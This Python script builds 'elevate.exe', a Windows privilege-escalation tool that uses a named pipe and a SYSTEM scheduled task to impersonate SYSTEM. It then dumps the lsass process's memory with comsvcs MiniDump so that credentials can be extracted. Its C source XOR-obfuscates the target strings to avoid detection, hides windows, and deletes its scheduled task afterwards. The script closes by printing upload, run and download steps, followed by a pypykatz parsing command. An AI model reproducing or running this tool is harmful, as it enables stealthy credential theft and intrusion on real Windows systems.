#!/usr/bin/env python3
"""
gen_elevate.py — Custom SYSTEM escalation: named pipe + scheduled task.
No GodPotato, no known signatures. SeImpersonatePrivilege required.
Flow: named pipe server -> SYSTEM schtask connects -> impersonate ->
      duplicate primary token -> CreateProcessWithTokenW(comsvcs MiniDump).
"""
import os, sys, subprocess, shutil, tempfile

ROOT = os.path.dirname(os.path.abspath(__file__))
OUT  = os.path.join(ROOT, 'elevate.exe')

KEY = 0x37
def enc(s):
    return ','.join(str(ord(c) ^ KEY) for c in s + '\x00')

lsass_enc   = enc('lsass.exe')
comsvcs_enc = enc('comsvcs.dll')
dump_enc    = enc('C:\\Windows\\Temp\\lsass.dat')
scht_enc    = enc('schtasks.exe')

# 92 = backslash, 34 = double-quote — used in snprintf to avoid escaping hell
c_src = f"""
#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <shellapi.h>
#include <tlhelp32.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

static void xd(char *out, const BYTE *e, int n) {{
    for (int i=0;i<n;i++) out[i]=(char)(e[i]^0x{KEY:02X});
}}

static DWORD find_pid(const char *name) {{
    WCHAR w[64]={{0}};
    for (int i=0;name[i];i++) w[i]=(WCHAR)(unsigned char)name[i];
    HANDLE snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if (snap==INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe={{sizeof(pe)}};
    DWORD pid=0;
    if (Process32FirstW(snap,&pe)) do {{
        if (_wcsicmp(pe.szExeFile,w)==0){{pid=pe.th32ProcessID;break;}}
    }} while(Process32NextW(snap,&pe));
    CloseHandle(snap);
    return pid;
}}

static void randstr(char *out, int n) {{
    static const char a[]="abcdefghijklmnopqrstuvwxyz0123456789";
    srand(GetTickCount()^GetCurrentProcessId());
    for (int i=0;i<n;i++) out[i]=a[rand()%36];
    out[n]=0;
}}

int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR cmd, int show) {{
    (void)h;(void)p;(void)cmd;(void)show;

    static const BYTE LENC[]={{{lsass_enc}}};
    static const BYTE DENC[]={{{dump_enc}}};
    static const BYTE SENC[]={{{scht_enc}}};
    static const BYTE CENC[]={{{comsvcs_enc}}};

    char lsass_name[32]={{0}}, dump_path[MAX_PATH]={{0}};
    char scht[64]={{0}}, comsvcs_name[32]={{0}};
    xd(lsass_name, LENC, sizeof(LENC)-1);
    xd(dump_path,  DENC, sizeof(DENC)-1);
    xd(scht,       SENC, sizeof(SENC)-1);
    xd(comsvcs_name, CENC, sizeof(CENC)-1);

    /* lsass PID */
    DWORD lpid = find_pid(lsass_name);
    if (!lpid) return 1;

    /* random names */
    char tag[9]={{0}}, task[13]={{0}};
    randstr(tag,8); randstr(task,12);

    /* pipe path: \\.\pipe\TAG  (build with char codes to avoid escape mess) */
    char pipe_path[64];
    snprintf(pipe_path, sizeof(pipe_path),
        "%c%c.%cpipe%c%s", 92,92,92,92, tag);

    /* SECURITY_ATTRIBUTES: allow SYSTEM to connect */
    SECURITY_DESCRIPTOR sd;
    SECURITY_ATTRIBUTES sa={{sizeof(sa),&sd,FALSE}};
    InitializeSecurityDescriptor(&sd, SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, TRUE, NULL, FALSE);

    HANDLE pipeh = CreateNamedPipeA(pipe_path,
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        1, 512, 512, 30000, &sa);
    if (pipeh == INVALID_HANDLE_VALUE) return 2;

    /* schtask: cmd /c echo.>\\.\pipe\TAG */
    /* /tr value quoted with char 34 */
    char create_args[512];
    snprintf(create_args, sizeof(create_args),
        "/create /tn %s /tr %ccmd /c echo.>%c%c.%cpipe%c%s%c /sc ONCE /st 00:00 /ru SYSTEM /f",
        task, 34, 92,92,92,92, tag, 34);

    char run_args[64], del_args[64];
    snprintf(run_args, sizeof(run_args), "/run /tn %s", task);
    snprintf(del_args, sizeof(del_args), "/delete /tn %s /f", task);

    /* launch schtasks via ShellExecuteA to avoid cmd.exe parent */
    ShellExecuteA(NULL,"open",scht,create_args,NULL,SW_HIDE);
    Sleep(800);
    ShellExecuteA(NULL,"open",scht,run_args,NULL,SW_HIDE);

    /* wait for SYSTEM process to connect */
    OVERLAPPED ov={{0}};
    ov.hEvent = CreateEventA(NULL,TRUE,FALSE,NULL);
    ConnectNamedPipe(pipeh, &ov);
    DWORD w = WaitForSingleObject(ov.hEvent, 25000);
    CloseHandle(ov.hEvent);
    ShellExecuteA(NULL,"open",scht,del_args,NULL,SW_HIDE);

    if (w != WAIT_OBJECT_0) {{ CloseHandle(pipeh); return 3; }}

    /* impersonate + duplicate */
    if (!ImpersonateNamedPipeClient(pipeh)) {{ CloseHandle(pipeh); return 4; }}

    HANDLE itok=NULL;
    if (!OpenThreadToken(GetCurrentThread(),TOKEN_ALL_ACCESS,FALSE,&itok)) {{
        RevertToSelf(); CloseHandle(pipeh); return 5;
    }}

    HANDLE stok=NULL;
    if (!DuplicateTokenEx(itok,TOKEN_ALL_ACCESS,NULL,
            SecurityImpersonation,TokenPrimary,&stok)) {{
        CloseHandle(itok); RevertToSelf(); CloseHandle(pipeh); return 6;
    }}
    CloseHandle(itok);
    RevertToSelf();
    CloseHandle(pipeh);

    /* build comsvcs MiniDump command */
    char sys_dir[MAX_PATH]={{0}};
    GetSystemDirectoryA(sys_dir, MAX_PATH);
    /* append backslash + comsvcs_name */
    int slen=(int)strlen(sys_dir);
    sys_dir[slen]=92; sys_dir[slen+1]=0;
    strncat(sys_dir, comsvcs_name, MAX_PATH-slen-2);

    char dump_cmd[512];
    snprintf(dump_cmd, sizeof(dump_cmd),
        "rundll32.exe %s,MiniDump %lu %s full",
        sys_dir, (unsigned long)lpid, dump_path);

    /* widen to WCHAR for CreateProcessWithTokenW */
    int wlen = MultiByteToWideChar(CP_ACP,0,dump_cmd,-1,NULL,0);
    WCHAR *wcmd = (WCHAR*)malloc((wlen+1)*sizeof(WCHAR));
    if (!wcmd) {{ CloseHandle(stok); return 7; }}
    MultiByteToWideChar(CP_ACP,0,dump_cmd,-1,wcmd,wlen);

    STARTUPINFOW si={{sizeof(si)}};
    si.dwFlags=STARTF_USESHOWWINDOW; si.wShowWindow=SW_HIDE;
    PROCESS_INFORMATION pi={{0}};

    BOOL ok = CreateProcessWithTokenW(stok, LOGON_WITH_PROFILE,
        NULL, wcmd, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    if (ok) {{
        WaitForSingleObject(pi.hProcess, 60000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }}
    free(wcmd);
    CloseHandle(stok);
    return ok ? 0 : 7;
}}
"""

tmp = tempfile.mkdtemp(prefix='elevate_build_')
try:
    src = os.path.join(tmp, 'elevate.c')
    exe = os.path.join(tmp, 'elevate.exe')
    open(src,'w').write(c_src)

    print('[*] Compiling elevate.exe ...')
    r = subprocess.run([
        'x86_64-w64-mingw32-gcc', '-O2', '-s', '-mwindows',
        '-o', exe, src,
        '-lkernel32', '-ladvapi32', '-lshell32', '-lshlwapi',
        '-Wl,--no-seh', '-fno-ident', '-fno-asynchronous-unwind-tables',
    ], capture_output=True, text=True)

    if r.returncode != 0:
        dbg = os.path.join(ROOT, 'elevate_debug.c')
        open(dbg,'w').write(c_src)
        print(f'[!] Build failed — source in {dbg}')
        print(r.stderr[-4000:])
        sys.exit(1)

    shutil.copy(exe, OUT)
finally:
    shutil.rmtree(tmp, ignore_errors=True)

print(f'[+] {OUT}  ({os.path.getsize(OUT):,} bytes)')
print()
print('Deploy (SeImpersonatePrivilege + admin required):')
print(f'  upload {OUT} C:\\Windows\\Temp\\elevate.exe')
print(f'  shell C:\\Windows\\Temp\\elevate.exe')
print(f'  download C:\\Windows\\Temp\\lsass.dat')
print()
print('Parse:  pypykatz lsa minidump lsass.dat')
